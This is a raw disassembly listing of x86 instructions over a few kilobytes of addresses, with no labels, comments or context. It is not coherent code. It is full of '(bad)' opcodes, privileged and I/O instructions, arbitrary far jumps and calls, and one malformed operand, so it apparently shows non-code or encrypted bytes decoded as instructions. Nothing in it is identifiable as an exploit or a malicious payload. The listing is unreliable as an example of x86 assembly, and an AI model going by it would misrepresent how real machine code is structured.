  49c250:	cmp    dh,BYTE PTR fs:[eax]
  49c253:	stc    
  49c254:	rdmsr  
  49c256:	(bad)  
  49c257:	push   edx
  49c258:	(bad)  
  49c25a:	xchg   edx,eax
  49c25b:	lds    esi,FWORD PTR [edi-0x5e866881]
  49c261:	and    DWORD PTR [ebx+0x3237c727],0x1f
  49c268:	jb     0x49c1fb
  49c26a:	add    DWORD PTR [edi],esi
  49c26c:	dec    ebx
  49c26d:	xchg   edi,eax
  49c26e:	xlat   BYTE PTR ds:[ebx]
  49c26f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c270:	shl    BYTE PTR [ecx-0x30f888be],1
  49c276:	(bad)  
  49c278:	jmp    0x18e4:0xc79b6f6b
  49c27f:	jmp    0x49c239
  49c281:	xor    al,0x37
  49c283:	(bad)  
  49c284:	xor    al,0xf5
  49c286:	mov    esi,0x3f426589
  49c28b:	jg     0x49c224
  49c28d:	(bad)  [eax]
  49c28f:	scas   eax,DWORD PTR es:[edi]
  49c290:	pop    edi
  49c291:	xor    DWORD PTR [ebp+0xf],eax
  49c294:	inc    ecx
  49c295:	xor    DWORD PTR [eax+0x73261c2e],ecx
  49c29b:	jnp    0x49c268
  49c29d:	sbb    cl,cl
  49c29f:	inc    esp
  49c2a0:	mov    ah,0xf7
  49c2a2:	xor    DWORD PTR ds:0xef4bad5d,edi
  49c2a8:	mov    edi,0xcd8aecb
  49c2ad:	sbb    al,0xb7
  49c2af:	iret   
  49c2b0:	out    0x41,eax
  49c2b2:	cmp    ch,ah
  49c2b4:	inc    edx
  49c2b5:	dec    ebp
  49c2b6:	inc    edi
  49c2b7:	cmp    BYTE PTR [edx-0x3f],dl
  49c2ba:	add    BYTE PTR [ebp+0x6f3927fc],0xcf
  49c2c1:	out    dx,eax
  49c2c2:	in     al,0x32
  49c2c4:	(bad)  
  49c2c5:	daa    
  49c2c6:	inc    ebx
  49c2c7:	inc    ecx
  49c2c8:	xor    BYTE PTR [ebx+0x54],al
  49c2cb:	cmp    dl,BYTE PTR ds:0x492fef0f
  49c2d1:	outs   dx,BYTE PTR ds:[esi]
  49c2d2:	stos   BYTE PTR es:[edi],al
  49c2d3:	lea    esi,[ecx+0x15]
  49c2d6:	xchg   BYTE PTR [edi+0x339a735],al
  49c2dc:	loope  0x49c300
  49c2de:	and    eax,DWORD PTR [edi+ebp*2-0x72]
  49c2e2:	pushf  
  49c2e3:	xor    cl,al
  49c2e5:	enter  0x4237,0x38
  49c2e9:	xor    al,BYTE PTR [ecx+0x1f76b771]
  49c2ef:	inc    edi
  49c2f0:	xor    ebx,DWORD PTR [edi+0x70]
  49c2f3:	mov    ch,0x1a
  49c2f5:	pop    edx
  49c2f6:	cmp    ebp,DWORD PTR [ebx+0x3]
  49c2f9:	iret   
  49c2fa:	rcr    BYTE PTR [edx+0x6265eb77],cl
  49c300:	adc    al,0xae
  49c302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c303:	inc    ebp
  49c304:	phaddsw mm1,QWORD PTR [edi+0x58]
  49c309:	or     bh,bh
  49c30b:	fild   DWORD PTR [edi+esi*4]
  49c30e:	add    ah,dl
  49c310:	inc    edi
  49c311:	das    
  49c312:	aas    
  49c313:	scas   al,BYTE PTR es:[edi]
  49c314:	push   ss
  49c315:	loope  0x49c321
  49c317:	xchg   DWORD PTR [esi-0x29],eax
  49c31a:	push   ebx
  49c31b:	enter  0x1035,0x39
  49c31f:	pop    es
  49c320:	jg     0x49c358
  49c322:	ret    0xa12a
  49c325:	enter  0x9f30,0xb
  49c329:	adc    DWORD PTR [ecx],ebx
  49c32b:	jns    0x49c323
  49c32d:	xor    eax,0x63aff738
  49c332:	jl     0x49c376
  49c334:	xlat   BYTE PTR ds:[ebx]
  49c335:	aas    
  49c336:	outs   dx,DWORD PTR ds:[esi]
  49c337:	xor    BYTE PTR [edx+0x32f78a83],cl
  49c33d:	out    0xd8,eax
  49c33f:	jne    0x49c386
  49c341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49c342:	repz inc esi
  49c344:	lahf   
  49c345:	xchg   ecx,eax
  49c346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c347:	repnz push eax
  49c349:	div    DWORD PTR [esi]
  49c34b:	xor    eax,0x7c25561e
  49c350:	das    
  49c351:	dec    edi
  49c352:	outs   dx,BYTE PTR ds:[esi]
  49c353:	iret   
  49c354:	das    
  49c355:	push   0x4c
  49c357:	enter  0xeea7,0x30
  49c35b:	xor    al,0xc7
  49c35d:	dec    esp
  49c35e:	pushf  
  49c35f:	pop    edx
  49c360:	adc    bh,bl
  49c362:	mov    edi,0x55a05a30
  49c367:	rol    edi,0x77
  49c36a:	and    bl,dh
  49c36c:	shl    DWORD PTR [esi-0x74f8d0a2],1
  49c372:	pop    ss
  49c373:	popa   
  49c374:	ins    BYTE PTR es:[edi],dx
  49c375:	sub    eax,ebx
  49c377:	add    edx,DWORD PTR [edi+0xb]
  49c37a:	lods   al,BYTE PTR ds:[esi]
  49c37b:	adc    ebx,DWORD PTR [eax-0x51]
  49c37e:	sub    esi,DWORD PTR [ebp+0x3f081ae4]
  49c384:	aaa    
  49c385:	imul   esp,DWORD PTR [ecx-0x24],0x410fbf9e
  49c38c:	das    
  49c38d:	inc    ecx
  49c38e:	rol    edx,1
  49c390:	stos   BYTE PTR es:[edi],al
  49c391:	or     DWORD PTR [edi+eiz*1+0x9],eax
  49c395:	sbb    DWORD PTR [esi-0x20],edx
  49c398:	xchg   DWORD PTR [bx-0x689e],ebx
  49c39d:	mov    DWORD PTR ds:0xbae07727,edx
  49c3a3:	mov    cl,0x6
  49c3a5:	jg     0x49c3e6
  49c3a7:	inc    ebp
  49c3a8:	ror    BYTE PTR [edx+0x25],0x4e
  49c3ac:	pop    ds
  49c3ad:	mov    edi,0xb0057058
  49c3b2:	sub    ch,BYTE PTR [edi-0x1d91f0be]
  49c3b8:	sub    eax,0xef461edf
  49c3bd:	jg     0x49c3c2
  49c3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c3c0:	call   0x144f:0xe7df46b8
  49c3c7:	imul   edx,eax,0x36
  49c3ca:	pop    ss
  49c3cb:	aaa    
  49c3cc:	dec    esp
  49c3cd:	outs   dx,BYTE PTR gs:[esi]
  49c3cf:	cs in  eax,dx
  49c3d1:	cmp    ah,ah
  49c3d3:	inc    edx
  49c3d4:	jae    0x49c44a
  49c3d6:	xor    BYTE PTR [edi+0x42d7324f],al
  49c3dc:	lods   eax,DWORD PTR ds:[esi]
  49c3dd:	pop    ss
  49c3de:	pop    ss
  49c3df:	xor    ecx,DWORD PTR [edx+0x5f16047c]
  49c3e5:	inc    esi
  49c3e6:	in     eax,0x76
  49c3e8:	pushf  
  49c3e9:	xor    al,0xef
  49c3eb:	xor    DWORD PTR [edx+0x2f],eax
  49c3ee:	jnp    0x49c438
  49c3f0:	push   edi
  49c3f1:	mov    eax,0xbf36af2a
  49c3f6:	mul    DWORD PTR [eax+0x5b8f6944]
  49c3fc:	push   cs
  49c3fd:	mov    WORD PTR [edx+eax*1+0x7],ds
  49c401:	fld    TBYTE PTR [esi+0x33]
  49c404:	inc    esi
  49c405:	xor    BYTE PTR [edi+0x69],dh
  49c408:	fwait
  49c409:	ud0    edi,DWORD PTR [ecx]
  49c40c:	pop    ebp
  49c40d:	pop    edx
  49c40e:	pusha  
  49c40f:	(bad)
  49c412:	mov    edi,0x848ad440
  49c417:	iret   
  49c418:	push   ss
  49c419:	add    bl,BYTE PTR [ecx+0xf4353b9]
  49c41f:	push   edi
  49c420:	sbb    eax,0x7902b1f
  49c425:	out    0x7f,eax
  49c427:	mov    eax,ds:0x3ab8cf1d
  49c42c:	xlat   BYTE PTR ds:[ebx]
  49c42d:	stos   DWORD PTR es:[edi],eax
  49c42e:	push   cs
  49c42f:	xchg   ecx,eax
  49c430:	push   cs
  49c431:	pop    ebp
  49c432:	dec    ebx
  49c433:	inc    ecx
  49c434:	push   ebx
  49c435:	das    
  49c436:	xor    eax,0xee8b11e
  49c43b:	sbb    ecx,DWORD PTR [edi]
  49c43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c43e:	popa   
  49c43f:	fwait
  49c440:	sbb    al,0x61
  49c442:	sahf   
  49c443:	inc    esp
  49c444:	(bad)  
  49c446:	and    BYTE PTR [edx+ebp*1],ch
  49c449:	jg     0x49c4b9
  49c44b:	xor    dh,BYTE PTR [eax+0x4313c288]
  49c451:	popa   
  49c452:	je     0x49c3f3
  49c454:	fstp   DWORD PTR [edx+0x32]
  49c457:	pop    ss
  49c458:	das    
  49c459:	xor    DWORD PTR [edi-0x9168f9],esp
  49c45f:	jnp    0x49c4c8
  49c461:	aaa    
  49c462:	xor    ebp,eax
  49c464:	aam    0xc9
  49c466:	xor    al,BYTE PTR [ebp+0x1b]
  49c469:	xor    eax,0x58075707
  49c46e:	pop    ss
  49c46f:	mov    bh,0xbf
  49c471:	xchg   edi,eax
  49c472:	mov    ecx,0xf6c6bc8
  49c477:	scas   eax,DWORD PTR es:[edi]
  49c478:	cmp    DWORD PTR [ebx+0x3618c48d],ecx
  49c47e:	xchg   DWORD PTR [edi],esp
  49c480:	addr16 es daa 
  49c483:	fild   QWORD PTR [ebx+0x2]
  49c486:	(bad)  
  49c489:	sbb    eax,0xb7a864c0
  49c48e:	ss mov bh,0xc2
  49c491:	in     al,0xaa
  49c493:	leave  
  49c494:	inc    ecx
  49c495:	xlat   BYTE PTR ds:[ebx]
  49c496:	inc    edx
  49c497:	dec    ebp
  49c498:	enter  0x3123,0xde
  49c49c:	idiv   BYTE PTR [ecx]
  49c49e:	cmp    BYTE PTR ds:0xbf2a6426,ah
  49c4a4:	xor    DWORD PTR [edi],esi
  49c4a6:	ja     0x49c51e
  49c4a8:	or     dh,BYTE PTR [edi-0x40713898]
  49c4ae:	push   edi
  49c4af:	lea    esp,[esi]
  49c4b1:	das    
  49c4b2:	sbb    esi,DWORD PTR [edx]
  49c4b4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c4b6:	cmp    DWORD PTR [ecx+0x370b35ac],ebx
  49c4bc:	pop    es
  49c4bd:	mov    ecx,0x6743e34a
  49c4c2:	(bad)  
  49c4c3:	xor    DWORD PTR [edx-0x25],ebp
  49c4c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c4c7:	cdq    
  49c4c8:	pop    ds
  49c4c9:	inc    ecx
  49c4ca:	jmp    FWORD PTR [edi]
  49c4cc:	xchg   esi,edi
  49c4ce:	cmp    dh,BYTE PTR [edi+esi*4+0x4938528f]
  49c4d5:	outs   dx,BYTE PTR ds:[esi]
  49c4d6:	je     0x49c46d
  49c4d8:	mov    bh,0x68
  49c4da:	sub    al,0x92
  49c4dc:	mov    bh,0xc3
  49c4de:	and    dh,BYTE PTR [eax-0x6850b725]
  49c4e4:	sub    BYTE PTR [ebx+edx*4+0x41d6536f],cl
  49c4eb:	sbb    BYTE PTR fs:[edi+0x3f],ch
  49c4ef:	test   al,0x88
  49c4f1:	pop    es
  49c4f2:	pushf  
  49c4f3:	inc    edx
  49c4f4:	addr16 daa 
  49c4f6:	lods   eax,DWORD PTR ds:[esi]
  49c4f7:	and    esp,DWORD PTR [ecx+edx*4]
  49c4fa:	inc    DWORD PTR [ebx-0x3e]
  49c4fd:	or     eax,0x41c74c8a
  49c502:	xchg   ebx,eax
  49c503:	xor    eax,0x4d6dafa6
  49c508:	iret   
  49c509:	out    0x87,eax
  49c50b:	pop    ss
  49c50c:	shl    DWORD PTR [edx-0x78c61a79],1
  49c512:	sbb    ecx,DWORD PTR [ebx+0x6dd51725]
  49c518:	rdmsr  
  49c51a:	mov    bh,0x37
  49c51c:	mov    WORD PTR [ebx+0x28],es
  49c51f:	(bad)  
  49c520:	xor    al,0xb7
  49c522:	into   
  49c523:	or     eax,0xc744c9a6
  49c528:	inc    ecx
  49c529:	addr16 pop es
  49c52b:	pop    edi
  49c52c:	fidiv  DWORD PTR [esi]
  49c52e:	daa    
  49c52f:	jnp    0x49c4d8
  49c531:	stos   DWORD PTR es:[edi],eax
  49c532:	ret    0x6dd0
  49c535:	dec    ebx
  49c536:	inc    edi
  49c537:	xor    eax,0x94c96f48
  49c53c:	mov    bh,0x34
  49c53e:	retf   
  49c53f:	bound  ebp,QWORD PTR [esp+eiz*2-0x1c]
  49c543:	scas   al,BYTE PTR es:[edi]
  49c544:	inc    ecx
  49c545:	inc    ebp
  49c546:	aaa    
  49c547:	andnps xmm0,XMMWORD PTR [esi+eax*2+0x1e]
  49c54c:	iret   
  49c54d:	inc    ecx
  49c54e:	inc    esp
  49c54f:	aaa    
  49c550:	and    DWORD PTR [ebp-0x28],ecx
  49c553:	test   DWORD PTR [edi],eax
  49c555:	scas   eax,DWORD PTR es:[edi]
  49c556:	cmc    
  49c557:	mov    ah,0xe3
  49c559:	or     cl,BYTE PTR [edi+0x31]
  49c55c:	test   DWORD PTR [edi+0x7c],0x4b83c762
  49c563:	pop    es
  49c564:	push   cs
  49c565:	xor    DWORD PTR [eax],esi
  49c567:	stc    
  49c568:	xchg   esi,eax
  49c569:	mov    WORD PTR [edx],?
  49c56b:	aas    
  49c56c:	add    esp,DWORD PTR ss:0x32273770
  49c573:	aas    
  49c574:	cmp    BYTE PTR [esi],dl
  49c576:	push   ss
  49c577:	lods   al,BYTE PTR ds:[esi]
  49c578:	pop    edx
  49c579:	scas   eax,DWORD PTR es:[edi]
  49c57a:	ja     0x49c50d
  49c57c:	fs nop
  49c57e:	jecxz  0x49c5e7
  49c580:	xor    eax,0x58114939
  49c585:	xchg   ecx,eax
  49c586:	(bad)
  49c58a:	push   edi
  49c58b:	mov    bl,0x44
  49c58d:	xchg   edi,edx
  49c58f:	dec    esp
  49c590:	mov    eax,0x3bbfc2c5
  49c595:	xlat   BYTE PTR ds:[ebx]
  49c596:	mov    eax,ds:0x1a2fd603
  49c59b:	(bad)  
  49c59c:	sbb    dh,BYTE PTR ss:[eax-0x10c4e0fd]
  49c5a3:	lahf   
  49c5a4:	imul   ebx,DWORD PTR [eax],0x32
  49c5a7:	ret    
  49c5a8:	xlat   BYTE PTR ds:[ebx]
  49c5a9:	xor    dh,bl
  49c5ab:	mov    eax,0xff19b6c6
  49c5b0:	inc    ebx
  49c5b1:	dec    edi
  49c5b2:	pop    ebx
  49c5b3:	(bad)  
  49c5b4:	lods   eax,DWORD PTR ds:[esi]
  49c5b5:	pop    ebx
  49c5b6:	pop    ebx
  49c5b7:	sahf   
  49c5b8:	arpl   WORD PTR [edx+0x5],ax
  49c5bb:	xor    edx,DWORD PTR [edx-0x7f]
  49c5be:	ds inc esi
  49c5c0:	xor    al,0x2b
  49c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c5c3:	xor    BYTE PTR [edx+0x4d70cfcf],cl
  49c5c9:	bound  ebx,QWORD PTR ds:0x7a0dd737
  49c5cf:	xchg   ebx,eax
  49c5d0:	or     eax,DWORD PTR [edi-0x169434cc]
  49c5d6:	ror    BYTE PTR [edx+0x6277ab84],cl
  49c5dc:	jb     0x49c639
  49c5de:	mov    BYTE PTR [ebp+0x7f],al
  49c5e1:	rdpmc  
  49c5e3:	and    esp,DWORD PTR [ebx]
  49c5e5:	pop    ss
  49c5e6:	cmp    BYTE PTR [esi],ch
  49c5e8:	push   cs
  49c5e9:	xor    al,0x30
  49c5eb:	inc    esp
  49c5ec:	adc    eax,0x32297c2
  49c5f1:	addr16 je 0x49c5ca
  49c5f4:	sub    dh,BYTE PTR [ecx+0x41]
  49c5f7:	iret   
  49c5f8:	jg     0x49c62f
  49c5fa:	lds    esp,FWORD PTR [ebx-0x6b]
  49c5fd:	mov    bh,cl
  49c5ff:	ror    bh,cl
  49c601:	push   cs
  49c602:	call   0x44553011
  49c607:	lahf   
  49c608:	and    ah,BYTE PTR [esi-0x6d]
  49c60b:	mov    bh,0x2e
  49c60d:	inc    edx
  49c60e:	(bad)  
  49c611:	lods   eax,DWORD PTR ds:[esi]
  49c612:	popa   
  49c613:	loop   0x49c5c4
  49c615:	inc    ebp
  49c616:	mov    bh,0x5f
  49c618:	cmc    
  49c619:	inc    ebx
  49c61a:	jmp    0x49c640
  49c61c:	(bad)  
  49c61e:	ss daa 
  49c620:	sub    al,0x87
  49c622:	ficom  DWORD PTR [edi]
  49c624:	jbe    0x49c667
  49c626:	sub    dh,BYTE PTR [eax]
  49c628:	call   0xf731:0x380f7c9c
  49c62f:	loope  0x49c5c5
  49c631:	xchg   ecx,eax
  49c632:	pop    ss
  49c633:	mov    bh,0x38
  49c635:	aaa    
  49c636:	cmp    ecx,eax
  49c638:	mov    ds:0xce5f015b,eax
  49c63d:	lahf   
  49c63e:	cmp    DWORD PTR [ebx+0x457058f0],esp
  49c644:	pop    DWORD PTR [edx]
  49c646:	out    0x5a,eax
  49c648:	inc    eax
  49c649:	push   es
  49c64a:	push   edx
  49c64b:	mov    dh,0xae
  49c64d:	xor    DWORD PTR ds:0x3416d792,0x4b5d801a
  49c657:	retf   
  49c658:	pop    ds
  49c659:	test   eax,0x46c5a7c9
  49c65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c65f:	xor    dl,dl
  49c661:	clc    
  49c662:	shl    BYTE PTR [ebx-0x67385001],0x7c
  49c669:	aaa    
  49c66a:	shl    DWORD PTR [edi],cl
  49c66c:	cmovbe eax,DWORD PTR [edi-0x6e6f9f84]
  49c673:	ss inc ecx
  49c675:	aaa    
  49c676:	(bad)  
  49c677:	sbb    eax,0x37358ed2
  49c67c:	addr16 out 0x3e,eax
  49c67f:	or     ebp,0x38d66708
  49c685:	ja     0x49c697
  49c687:	add    ecx,DWORD PTR [ecx-0x49]
  49c68a:	inc    ecx
  49c68b:	setnp  BYTE PTR [ebx+eax*4-0x37]
  49c690:	cmp    BYTE PTR [edx],ch
  49c692:	rdtsc  
  49c694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c695:	and    esp,DWORD PTR [ebx]
  49c697:	pop    ss
  49c698:	xchg   BYTE PTR [esi+0x74364534],dl
  49c69e:	mov    al,0x2b
  49c6a0:	and    edi,ecx
  49c6a2:	mov    edi,0x1e16eef9
  49c6a7:	das    
  49c6a8:	inc    edi
  49c6a9:	inc    ebx
  49c6aa:	sysenter 
  49c6ac:	leave  
  49c6ad:	in     eax,0xe9
  49c6af:	or     eax,0x3035163f
  49c6b4:	add    al,BYTE PTR [ecx-0x1a]
  49c6b7:	(bad)  
  49c6b8:	inc    ecx
  49c6b9:	lahf   
  49c6ba:	xor    al,BYTE PTR [ebp-0x58e8f48b]
  49c6c0:	inc    edx
  49c6c1:	xchg   edi,eax
  49c6c2:	adc    DWORD PTR [eax],eax
  49c6c4:	push   ebx
  49c6c5:	and    esi,DWORD PTR [edi+0x36]
  49c6c8:	dec    edi
  49c6c9:	call   0xcf32:0x49e4d234
  49c6d0:	xor    ebp,DWORD PTR [ebp-0x116d36]
  49c6d6:	inc    edx
  49c6d7:	outs   dx,DWORD PTR ds:[esi]
  49c6d8:	outs   dx,DWORD PTR ds:[esi]
  49c6d9:	adc    eax,0xb7f7eb17
  49c6de:	inc    ebx
  49c6df:	ffreep st(7)
  49c6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49c6e2:	dec    edx
  49c6e3:	jecxz  0x49c725
  49c6e5:	dec    edi
  49c6e6:	repz inc esi
  49c6e8:	mov    eax,ds:0x370f4541
  49c6ed:	push   esi
  49c6ee:	sub    al,0x79
  49c6f0:	and    bh,BYTE PTR [esi+0x19092f31]
  49c6f6:	cmp    DWORD PTR [edx-0x6fcdc712],eax
  49c6fc:	xchg   ecx,eax
  49c6fd:	mov    DWORD PTR [eax+0x4130ff36],esp
  49c703:	leave  
  49c704:	leave  
  49c705:	ins    DWORD PTR es:[edi],dx
  49c706:	xchg   ecx,eax
  49c707:	ss jg  0x49c74b
  49c70a:	inc    ecx
  49c70b:	je     0x49c695
  49c70d:	pop    esp
  49c70e:	lods   al,BYTE PTR ds:[esi]
  49c70f:	(bad)  
  49c710:	xor    al,0xaa
  49c712:	xor    eax,0x3fd8f889
  49c717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c718:	(bad)  
  49c719:	in     al,0xe4
  49c71b:	jbe    0x49c6a5
  49c71d:	mov    bh,0xf
  49c71f:	inc    ebx
  49c720:	inc    edx
  49c721:	in     al,0xe4
  49c723:	in     al,0xe4
  49c725:	inc    ecx
  49c726:	cmp    DWORD PTR [eax],edi
  49c728:	aaa    
  49c729:	aad    0xe4
  49c72b:	in     al,0xe4
  49c72d:	ss xor eax,0x485be734
  49c733:	adc    eax,0x1c58b3d2
  49c738:	les    edx,FWORD PTR ds:0x508f412f
  49c73e:	dec    esp
  49c73f:	ror    BYTE PTR [edx-0x5c],cl
  49c742:	fistp  QWORD PTR [ebx+ecx*2-0x62]
  49c746:	mov    BYTE PTR [esi+0x34],ch
  49c749:	sysexit 
  49c74b:	pushf  
  49c74c:	pushf  
  49c74d:	pushf  
  49c74e:	pushf  
  49c74f:	xor    al,0x33
  49c751:	xor    dh,BYTE PTR [ecx]
  49c753:	dec    eax
  49c754:	repnz xchg edx,eax
  49c756:	cwde   
  49c757:	dec    edi
  49c758:	xor    al,0x8e
  49c75a:	lods   eax,DWORD PTR ds:[esi]
  49c75b:	adc    eax,0x6fff8788
  49c760:	and    ebx,eax
  49c762:	adc    esp,DWORD PTR [ebx]
  49c764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c765:	inc    ebx
  49c766:	lock jbe 0x49c7c3
  49c769:	sar    BYTE PTR [ecx],0x4f
  49c76c:	adc    ebx,DWORD PTR [ebx+ebp*2+0x44]
  49c770:	and    BYTE PTR [edi-0x5e9517e1],dh
  49c776:	inc    ebp
  49c777:	jg     0x49c728
  49c779:	test   DWORD PTR [ebp-0x60],edx
  49c77c:	push   0xffffffa7
  49c77e:	push   ss
  49c77f:	sub    ebp,ecx
  49c781:	add    al,0x9e
  49c783:	ud2    
  49c785:	jecxz  0x49c707
  49c787:	fisub  DWORD PTR [edi+ebp*8+0x7]
  49c78b:	xchg   edx,eax
  49c78c:	mov    ch,0x70
  49c78e:	mov    al,0x47
  49c790:	das    
  49c791:	push   ebx
  49c792:	or     BYTE PTR [esi+0x30fa5d26],0x5b
  49c799:	call   0x67a57c88
  49c79e:	dec    esi
  49c79f:	add    eax,DWORD PTR [edx]
  49c7a1:	mov    eax,DWORD PTR [ebx+eiz*8]
  49c7a4:	mov    bl,0xf
  49c7a6:	mov    al,0x42
  49c7a8:	clc    
  49c7a9:	jbe    0x49c742
  49c7ab:	das    
  49c7ac:	inc    ebx
  49c7ad:	sub    ecx,DWORD PTR [eax]
  49c7af:	add    eax,0x1e776c2
  49c7b4:	pop    edi
  49c7b5:	jo     0x49c7fd
  49c7b7:	outs   dx,DWORD PTR ds:[esi]
  49c7b8:	add    eax,0xde277fb7
  49c7bd:	or     DWORD PTR [eax+0x7f33b01d],0xdb475f0e
  49c7c7:	sbb    ebx,ebx
  49c7c9:	outs   dx,DWORD PTR ds:[esi]
  49c7ca:	xchg   edx,eax
  49c7cb:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  49c7cd:	xchg   edx,eax
  49c7ce:	xchg   esp,eax
  49c7cf:	or     eax,DWORD PTR [ebp+0x1fabbe75]
  49c7d5:	inc    edx
  49c7d6:	aas    
  49c7d7:	aaa    
  49c7d8:	xor    eax,DWORD PTR [esi]
  49c7da:	add    edi,DWORD PTR ds:0x92ca5b6a
  49c7e0:	add    esp,DWORD PTR [esi+0x440f04d9]
  49c7e6:	pop    ds
  49c7e7:	xor    al,0xb5
  49c7e9:	inc    eax
  49c7ea:	les    ebx,FWORD PTR [edi]
  49c7ec:	adc    cl,BYTE PTR [ebx+0x4b]
  49c7ef:	push   esp
  49c7f0:	addr16 out dx,al
  49c7f2:	xor    BYTE PTR [esp+edi*4+0x7b],ch
  49c7f6:	rcl    dl,cl
  49c7f8:	ja     0x49c840
  49c7fa:	fistp  DWORD PTR [ebp+0x12]
  49c7fd:	out    dx,eax
  49c7fe:	hlt    
  49c7ff:	sbb    DWORD PTR [edx+0x27],0x4f
  49c803:	and    al,0x60
  49c805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c806:	dec    esp
  49c807:	out    0x44,eax
  49c809:	mov    edx,0xc31fbef4
  49c80e:	sbb    dh,BYTE PTR [ecx]
  49c810:	in     eax,dx
  49c811:	(bad)  
  49c812:	in     eax,dx
  49c813:	pop    eax
  49c814:	sahf   
  49c815:	dec    edi
  49c816:	inc    edx
  49c817:	addr16 push ss
  49c819:	(bad)  
  49c81b:	add    BYTE PTR [ebx+0x1c8344bf],dl
  49c821:	push   esi
  49c822:	pop    esp
  49c823:	cmp    dl,BYTE PTR [edi-0x16]
  49c826:	jmp    0x49c7ba
  49c828:	pop    ebp
  49c829:	fdivr  DWORD PTR [esi+0x3757b363]
  49c82f:	arpl   WORD PTR [ebx+0x1],di
  49c832:	push   edi
  49c833:	sub    ecx,DWORD PTR [ebp+0x5a1e87bb]
  49c839:	inc    eax
  49c83a:	pop    esp
  49c83b:	add    ecx,DWORD PTR [ebx]
  49c83d:	imul   BYTE PTR [esi+0x2f0b0aee]
  49c843:	outs   dx,DWORD PTR ds:[esi]
  49c844:	jb     0x49c809
  49c846:	lock cs push ds
  49c849:	out    dx,eax
  49c84a:	out    dx,al
  49c84b:	aaa    
  49c84c:	push   cs
  49c84d:	stos   DWORD PTR es:[edi],eax
  49c84e:	retf   
  49c84f:	cld    
  49c850:	iret   
  49c851:	adc    eax,0x4fbaa3f7
  49c856:	or     DWORD PTR [ebx+0x65],ebp
  49c859:	jb     0x49c8c9
  49c85b:	gs ins BYTE PTR es:[edi],dx
  49c85d:	xor    ebx,DWORD PTR [ebx-0x16f4a001]
  49c863:	adc    eax,DWORD PTR [esi]
  49c865:	inc    edi
  49c866:	gs je  0x49c8b6
  49c869:	outs   dx,DWORD PTR ds:[esi]
  49c86a:	fs jne 0x49c8d9
  49c86d:	gs inc esi
  49c86f:	imul   ecx,DWORD PTR [esi+0x61],0xdfee0a6c
  49c876:	ins    DWORD PTR es:[edi],dx
  49c877:	gs push esp
  49c879:	fs inc ebp
  49c87b:	inc    edi
  49c87c:	add    BYTE PTR [esi+eax*1+0x6e],dh
  49c880:	add    al,0xc4
  49c882:	dec    ecx
  49c883:	(bad)  
  49c884:	(bad)  
  49c885:	out    dx,eax
  49c886:	push   ecx
  49c887:	mov    edi,0xb1884a1
  49c88c:	shl    BYTE PTR [edx+eax*1-0x1],0xe0
  49c891:	push   0x90b83e88
  49c896:	adc    eax,DWORD PTR [eax+0x0]
  49c899:	push   cs
  49c89a:	push   esi
  49c89b:	and    eax,ebx
  49c89d:	call   eax
  49c89f:	sbb    ah,BYTE PTR [edi]
  49c8a1:	ret    
  49c8a2:	sbb    al,0x6c
  49c8a4:	jp     0x49c84a
  49c8a6:	arpl   di,ax
  49c8a8:	out    dx,eax
  49c8a9:	fbstp  TBYTE PTR [esi]
  49c8ab:	mov    dl,0x43
  49c8ad:	sub    ebp,DWORD PTR [ebx]
  49c8af:	mov    edi,0x1136b48d
  49c8b4:	scas   eax,DWORD PTR es:[edi]
  49c8b5:	das    
  49c8b6:	imul   ecx,DWORD PTR [eax+0x79],0xffffffa4
  49c8ba:	jmp    0x49c8ec
  49c8bc:	xchg   ebx,eax
  49c8bd:	pop    ebx
  49c8be:	aaa    
  49c8bf:	or     al,0xb9
  49c8c1:	aaa    
  49c8c2:	or     edx,DWORD PTR [edx-0x6a]
  49c8c5:	(bad)  
  49c8c6:	scas   eax,DWORD PTR es:[edi]
  49c8c7:	scas   eax,DWORD PTR es:[edi]
  49c8c8:	jecxz  0x49c895
  49c8ca:	push   cs
  49c8cb:	xor    al,0x1a
  49c8cd:	aam    0xd4
  49c8cf:	daa    
  49c8d0:	mov    DWORD PTR [edi-0x26e9d6f7],0xe9f2a30f
  49c8da:	adc    DWORD PTR [esi+0x27],esi
  49c8dd:	idiv   DWORD PTR [eax]
  49c8df:	pop    ebx
  49c8e0:	xor    eax,DWORD PTR [edi]
  49c8e2:	add    DWORD PTR [edi-0x56308c30],ecx
  49c8e8:	add    BYTE PTR [ecx-0x79949c71],cl
  49c8ee:	jb     0x49c96c
  49c8f0:	adc    ecx,ebx
  49c8f2:	dec    ebx
  49c8f3:	mov    edx,0xd3783bc0
  49c8f8:	outs   dx,DWORD PTR ds:[esi]
  49c8f9:	addr16 mov bl,0x8a
  49c8fc:	inc    ebx
  49c8fd:	push   edx
  49c8fe:	pop    ss
  49c8ff:	addr16 test edi,0xb5208585
  49c906:	aaa    
  49c907:	xor    DWORD PTR [eax-0x34e0d6bf],0x5a52b73
  49c911:	shl    BYTE PTR [edi-0x5916bf91],0x75
  49c918:	out    dx,al
  49c919:	xchg   edi,eax
  49c91a:	push   ds
  49c91b:	sub    al,0xc6
  49c91d:	inc    esp
  49c91e:	stos   DWORD PTR es:[edi],eax
  49c91f:	add    DWORD PTR [ebx],0xffffff8b
  49c922:	dec    eax
  49c923:	sub    eax,0x8313b732
  49c928:	mov    cl,0x5d
  49c92a:	push   edx
  49c92b:	add    esi,DWORD PTR [edi-0x7d]
  49c92e:	pop    ss
  49c92f:	mov    BYTE PTR [ebp-0x3e],al
  49c932:	mov    bh,0x27
  49c934:	or     BYTE PTR [esp+ebp*4+0x7e493478],0x44
  49c93c:	dec    ecx
  49c93d:	mov    BYTE PTR [ecx-0x6f36c6f7],al
  49c943:	dec    eax
  49c944:	inc    edi
